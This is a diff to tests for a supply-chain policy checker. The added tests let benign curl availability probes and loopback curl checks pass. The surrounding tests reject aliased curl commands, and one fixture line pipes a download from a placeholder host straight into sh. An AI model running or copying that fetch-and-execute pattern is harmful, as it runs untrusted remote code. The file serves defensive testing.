@@ -96,6 +96,26 @@ test('rejects variable-indirected curl commands', async () => {
   assert.ok(result.errors.some((error) => error.includes('dynamic curl/wget source')))
 })
 
+test('ignores command -v curl availability probes', async () => {
+  const root = await fixture({
+    'infra/lab-smoke-drivers.sh': 'command -v curl >/dev/null 2>&1 || exit 1\n',
+  })
+
+  const result = await checkSupplyChainPolicy(root)
+
+  assert.deepEqual(result.errors, [])
+})
+
+test('ignores loopback-only curl host-header checks', async () => {
+  const root = await fixture({
+    'infra/lab-smoke-drivers.sh': 'curl --noproxy \'*\' -fsS -H "Host: web.example.com" "http://127.0.0.1/"\n',
+  })
+
+  const result = await checkSupplyChainPolicy(root)
+
+  assert.deepEqual(result.errors, [])
+})
+
 test('rejects aliased and token-assembled curl commands', async () => {
   for (const script of [
     'fetcher=curl\n"$fetcher" https://example.com/tool | sh\n',
